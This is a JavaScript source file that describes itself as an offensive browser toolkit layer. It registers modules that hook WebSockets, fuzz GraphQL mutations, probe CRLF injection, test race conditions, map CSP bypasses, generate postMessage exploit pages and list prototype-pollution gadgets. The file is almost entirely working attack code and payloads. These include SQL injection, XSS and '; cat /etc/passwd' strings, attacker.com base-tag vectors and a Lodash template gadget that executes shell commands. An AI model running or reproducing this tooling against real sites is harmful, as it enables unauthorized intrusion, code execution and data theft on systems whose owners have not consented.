// language: JavaScript, file: reconstrike_v13_offensive.js, target: modern browsers
// Layer 2 of 4. Depends on ReconCore (v13.0). Registers under ReconCore.modules.

(function () {
  'use strict';
  if (!window.ReconCore) throw new Error('ReconCore missing -- load layer 1 first');
  const { eventBus, storage, worker, secure } = window.ReconCore;

  const modules = window.ReconCore.modules = window.ReconCore.modules || {};
  const b64e = (u8) => { let s = ''; for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]); return btoa(s); };

  // ══════════════════════════════════════════════════════════════
  // MODULE 1 -- WebSocket Fuzzer
  // ══════════════════════════════════════════════════════════════
  modules.wsFuzzer = (() => {
    const sockets = new Map();
    const captured = [];

    function hook() {
      const orig = window.WebSocket;
      if (!orig || orig.__rsHooked) return;
      function Wrapped(url, protocols) {
        const ws = new orig(url, protocols);
        const id = Math.random().toString(36).slice(2);
        sockets.set(id, { url, ws, opened: Date.now(), sent: 0, received: 0, messages: [] });
        ws.addEventListener('open',  () => eventBus.emit('ws:open',  { id, url }));
        ws.addEventListener('close', () => { eventBus.emit('ws:close', { id, url }); sockets.delete(id); });
        ws.addEventListener('message', (ev) => {
          const rec = sockets.get(id);
          if (!rec) return;
          rec.received++;
          const data = typeof ev.data === 'string' ? ev.data.slice(0, 4096) : `[binary ${ev.data.byteLength || '?'}B]`;
          rec.messages.push({ dir: 'in', t: Date.now(), data });
          if (rec.messages.length > 200) rec.messages.shift();
          eventBus.emit('ws:message', { id, dir: 'in', data });
        });
        const origSend = ws.send.bind(ws);
        ws.send = function (data) {
          const rec = sockets.get(id);
          if (rec) {
            rec.sent++;
            rec.messages.push({ dir: 'out', t: Date.now(), data: typeof data === 'string' ? data.slice(0, 4096) : '[binary]' });
            eventBus.emit('ws:message', { id, dir: 'out', data });
          }
          return origSend(data);
        };
        return ws;
      }
      Wrapped.prototype = orig.prototype;
      Wrapped.CONNECTING = orig.CONNECTING; Wrapped.OPEN = orig.OPEN;
      Wrapped.CLOSING = orig.CLOSING;       Wrapped.CLOSED = orig.CLOSED;
      Wrapped.__rsHooked = true;
      window.WebSocket = Wrapped;
    }

    const PAYLOADS = [
      '{"action":"ping"}',
      '{"__proto__":{"polluted":true}}',
      '{"constructor":{"prototype":{"polluted":true}}}',
      '{"type":"subscribe","channel":"../admin"}',
      '{"id":null}',
      '{"id":"00000000-0000-0000-0000-000000000000"}',
      '{"id":1e309}',
      '\u0000\u0001\u0002',
      '{"$where":"1==1"}',
      '{"query":"{__typename}"}',
    ];

    async function fuzz(socketId, rounds = 1) {
      const rec = sockets.get(socketId);
      if (!rec || rec.ws.readyState !== 1) return { ok: false, reason: 'socket not open' };
      const results = [];
      for (let r = 0; r < rounds; r++) {
        for (const p of PAYLOADS) {
          try {
            rec.ws.send(p);
            results.push({ payload: p.slice(0, 80), sent: true, t: Date.now() });
            await new Promise(res => setTimeout(res, 60 + Math.random() * 120));
          } catch (e) { results.push({ payload: p.slice(0, 80), sent: false, err: e.message }); }
        }
      }
      return { ok: true, count: results.length, results };
    }

    hook();
    return { sockets, captured, fuzz, list: () => Array.from(sockets.entries()) };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 2 -- Race Condition / TOCTOU Tester
  // ══════════════════════════════════════════════════════════════
  modules.race = (() => {
    async function sendConcurrent({ url, method = 'POST', headers = {}, body = '', n = 20, credentials = 'include' }) {
      const reqs = [];
      for (let i = 0; i < n; i++) {
        reqs.push(fetch(url, { method, headers, body, credentials })
          .then(r => r.text().then(t => ({ i, status: r.status, len: t.length, snippet: t.slice(0, 300), t: performance.now() })))
          .catch(e => ({ i, err: e.message, t: performance.now() })));
      }
      const results = await Promise.all(reqs);
      const byStatus = {};
      results.forEach(r => { const k = r.status || 'ERR'; byStatus[k] = (byStatus[k] || 0) + 1; });
      const successes = results.filter(r => r.status && r.status >= 200 && r.status < 300).length;
      const inconsistent = new Set(results.map(r => r.snippet)).size > 1;
      const verdict =
        successes > 1 && n > 1 ? 'RACE-DETECTED: multiple success responses for one-shot op' :
        inconsistent ? 'INCONSISTENT: responses differ -- possible TOCTOU' :
        'no signal';
      return { verdict, byStatus, successes, total: n, inconsistent, results };
    }
    return { sendConcurrent };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 3 -- CSP Bypass Analyzer
  // ══════════════════════════════════════════════════════════════
  modules.csp = (() => {
    function parseCSP(str) {
      const out = {};
      String(str || '').split(';').forEach(d => {
        const [k, ...v] = d.trim().split(/\s+/);
        if (k) out[k.toLowerCase()] = v;
      });
      return out;
    }

    function analyze(meta) {
      const csp = parseCSP(meta);
      const findings = [];
      const scriptSrc = (csp['script-src'] || csp['default-src'] || []).join(' ');
      const objSrc    = (csp['object-src'] || csp['default-src'] || []).join(' ');

      if (!meta) { findings.push({ sev: 'HIGH', issue: 'No CSP meta tag found' }); return { csp, findings }; }

      if (scriptSrc.includes("'unsafe-inline'")) findings.push({ sev: 'CRITICAL', issue: "'unsafe-inline' -- inline scripts execute", vector: '<script>alert(1)</script>' });
      if (scriptSrc.includes("'unsafe-eval'"))   findings.push({ sev: 'CRITICAL', issue: "'unsafe-eval' -- eval/Function run", vector: 'eval("alert(1)")' });
      if (scriptSrc.includes('*') || scriptSrc.includes('http:')) findings.push({ sev: 'HIGH', issue: 'Wildcard/insecure script source', vector: 'script-src https://attacker.com/x.js' });
      if (scriptSrc.includes('data:'))           findings.push({ sev: 'HIGH', issue: 'data: allowed in script-src', vector: '<script src="data:text/javascript,alert(1)">' });
      if (scriptSrc.includes('https://cdn.jsdelivr.net') || scriptSrc.includes('unpkg.com')) findings.push({ sev: 'MEDIUM', issue: 'JSONP-capable CDN allowlisted -- known bypass', vector: 'jsonp hijack' });
      if (scriptSrc.includes('https://cdnjs.cloudflare.com') || scriptSrc.includes('ajax.googleapis.com')) findings.push({ sev: 'MEDIUM', issue: 'Legacy CDN allowlisted -- angular/JSONP bypasses exist' });

      if (!objSrc.includes("'none'")) findings.push({ sev: 'HIGH', issue: "object-src not 'none' -- plugin-based XSS", vector: '<object data="data:text/html,<script>alert(1)</script>">' });
      if (!meta.includes('base-uri')) findings.push({ sev: 'MEDIUM', issue: 'base-uri not restricted -- base tag injection', vector: '<base href="//attacker.com/">' });
      if (!meta.includes('frame-ancestors')) findings.push({ sev: 'MEDIUM', issue: 'No frame-ancestors -- clickjacking possible' });
      if (!meta.includes('form-action')) findings.push({ sev: 'LOW', issue: 'form-action unrestricted -- exfil via <form>' });

      const nonceMatch = scriptSrc.match(/'nonce-([^']+)'/);
      if (nonceMatch) {
        const nonce = nonceMatch[1];
        if (nonce.length < 16) findings.push({ sev: 'HIGH', issue: `Nonce too short (${nonce.length} chars)` });
        const scripts = Array.from(document.querySelectorAll('script'));
        const reused = scripts.length && scripts.filter(s => s.nonce === nonce).length > 1;
        if (reused) findings.push({ sev: 'LOW', issue: `Nonce reused across ${scripts.length} scripts -- cacheable` });
      }
      return { csp, findings };
    }

    function scan() {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return analyze(meta ? meta.content : null);
    }
    return { scan, analyze, parseCSP };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 4 -- GraphQL Mutation Fuzzer
  // ══════════════════════════════════════════════════════════════
  modules.graphql = (() => {
    async function introspect(endpoint, headers = {}) {
      const q = JSON.stringify({ query: `query IntrospectSchema { __schema { queryType{name} mutationType{name} types{ name kind fields{name args{name type{name kind ofType{name}}} type{name kind ofType{name}}} } } }` });
      try {
        const r = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', ...headers }, body: q, credentials: 'omit' });
        if (!r.ok) return { ok: false, status: r.status };
        const d = await r.json();
        if (!d?.data?.__schema) return { ok: false, reason: 'no schema' };
        const types = d.data.__schema.types.filter(t => !t.name.startsWith('__'));
        const mutations = types.filter(t => t.name === d.data.__schema.mutationType?.name)
          .flatMap(t => t.fields || []);
        return { ok: true, schema: d.data.__schema, types, mutations };
      } catch (e) { return { ok: false, error: e.message }; }
    }

    const INJECTION_VECTORS = [
      { name: 'SQLi',      payload: `"' OR 1=1--` },
      { name: 'NoSQLi',    payload: `{"$ne":null}` },
      { name: 'XSS',       payload: `<img src=x onerror=alert(1)>` },
      { name: 'SSTI',      payload: `{{7*7}}` },
      { name: 'Command',   payload: `; cat /etc/passwd` },
      { name: 'Path',      payload: `../../etc/passwd` },
      { name: 'ProtoPol',  payload: `{"__proto__":{"x":1}}` },
      { name: 'Null',      payload: null },
      { name: 'IntOver',   payload: 2147483647 + 1 },
    ];

    async function fuzzMutation(endpoint, mutationName, args, baseHeaders = {}, fields = 'id') {
      const results = [];
      for (const v of INJECTION_VECTORS) {
        const argsStr = args.map(a => `${a.name}: ${JSON.stringify(v.payload)}`).join(', ');
        const body = JSON.stringify({ query: `mutation F { ${mutationName}(${argsStr}) { ${fields} } }` });
        try {
          const r = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json', ...baseHeaders }, body, credentials: 'omit' });
          const text = await r.text();
          results.push({ vector: v.name, status: r.status, len: text.length, snippet: text.slice(0, 300) });
          await new Promise(res => setTimeout(res, 80));
        } catch (e) { results.push({ vector: v.name, err: e.message }); }
      }
      const interesting = results.filter(r => r.status && r.status >= 500);
      return { results, flagged: interesting };
    }

    return { introspect, fuzzMutation, INJECTION_VECTORS };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 5 -- CRLF / Header Injection Prober
  // ══════════════════════════════════════════════════════════════
  modules.crlf = (() => {
    const PAYLOADS = [
      '%0d%0aX-Injected: rs',
      '%0aX-Injected: rs',
      '%0d%0a%0d%0a<html>rs</html>',
      '\\r\\nX-Injected: rs',
      '%E5%98%8A%E5%98%8DX-Injected: rs',   // unicode CRLF
    ];

    async function probe(baseUrl, params) {
      const out = [];
      for (const p of params) {
        for (const pl of PAYLOADS) {
          const u = new URL(baseUrl, location.href);
          u.searchParams.set(p, pl);
          try {
            const r = await fetch(u.href, { credentials: 'omit', redirect: 'manual' });
            const hdr = r.headers.get('x-injected');
            const ct = r.headers.get('content-type') || '';
            const reflected = hdr || (ct.includes('text/html') && pl.includes('<html>'));
            out.push({ param: p, payload: pl, status: r.status, injected: hdr, reflected: !!reflected });
            await new Promise(res => setTimeout(res, 80));
          } catch (e) { out.push({ param: p, payload: pl, err: e.message }); }
        }
      }
      return out;
    }
    return { probe, PAYLOADS };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 6 -- PostMessage Auto-Exploit Builder
  // ══════════════════════════════════════════════════════════════
  modules.pmExploit = (() => {
    function buildExploit(targetOrigin, messageShape) {
      const payload = JSON.stringify(messageShape || {
        type: 'getUser',
        url: 'javascript:alert(document.domain)',
        callback: 'alert',
        data: { __proto__: { polluted: true } }
      });
      return `<!DOCTYPE html>
<html><head><title>postMessage PoC</title></head>
<body>
<h3>postMessage exploit → ${targetOrigin}</h3>
<iframe id="t" src="${targetOrigin}" style="width:100%;height:300px"></iframe>
<textarea id="out" style="width:100%;height:200px"></textarea>
<script>
var f = document.getElementById('t');
f.onload = function () {
  var msgs = [${payload}];
  msgs.forEach(function (m) {
    try { f.contentWindow.postMessage(m, '${targetOrigin}'); } catch (e) { console.error(e); }
  });
};
window.addEventListener('message', function (ev) {
  document.getElementById('out').value += '[from ' + ev.origin + '] ' + JSON.stringify(ev.data) + '\\n';
});
<\/script>
</body></html>`;
    }
    return { buildExploit };
  })();

  // ══════════════════════════════════════════════════════════════
  // MODULE 7 -- Prototype Pollution → Gadget Mapper
  // ══════════════════════════════════════════════════════════════
  modules.protoChain = (() => {
    const GADGETS = [
      { lib: 'jQuery <3.4',   sink: '$("<img>") + html()', gadget: `{"__proto__":{"sourceURL":"\\n<script>alert(1)</script>"}}` },
      { lib: 'Lodash <4.17.17', sink: '_.template',       gadget: `{"__proto__":{"sourceURL":"\\n<%= global.process.mainModule.require('child_process').execSync('id') %>"}}` },
      { lib: 'Vue 2',         sink: 'component v-html',    gadget: `{"__proto__":{"template":"<img src=x onerror=alert(1)>"}}` },
      { lib: 'AngularJS',     sink: 'expression eval',     gadget: `{"__proto__":{"ngExpression":"alert(1)"}}` },
      { lib: 'React 15',      sink: 'createElement',       gadget: `{"__proto__":{"dangerouslySetInnerHTML":{"__html":"<img onerror=alert(1) src=x>"}}}` },
    ];
    function map() {
      const p = window.ReconCore?.modules?.framework?.profile?.() || {};
      const out = [];
      GADGETS.forEach(g => {
        if (Object.keys(p).some(k => g.lib.toLowerCase().includes(k.toLowerCase()))) out.push(g);
      });
      return out.length ? out : GADGETS;
    }
    return { map, GADGETS };
  })();

  // ══════════════════════════════════════════════════════════════
  // REGISTRY META
  // ══════════════════════════════════════════════════════════════
  const META = {
    wsFuzzer:   { name: 'WebSocket Fuzzer',          sev: 'HIGH',     needs: 'WS active on target' },
    race:       { name: 'Race Condition Tester',     sev: 'HIGH',     needs: 'state-changing endpoint' },
    csp:        { name: 'CSP Bypass Analyzer',       sev: 'MEDIUM',   needs: 'CSP meta tag' },
    graphql:    { name: 'GraphQL Mutation Fuzzer',   sev: 'CRITICAL', needs: 'GraphQL endpoint' },
    crlf:       { name: 'CRLF/Header Injection',     sev: 'HIGH',     needs: 'reflected params' },
    pmExploit:  { name: 'postMessage Exploit Builder', sev: 'MEDIUM', needs: 'postMessage listener' },
    protoChain: { name: 'Prototype Pollution Gadgets', sev: 'CRITICAL', needs: 'confirmed PP' },
  };

  window.ReconCore.register = (name) => META[name];
  window.ReconCore.modulesMeta = META;
  eventBus.emit('modules:ready', { count: Object.keys(META).length, names: Object.keys(META) });
  if (typeof completion === 'function') completion(true);
})();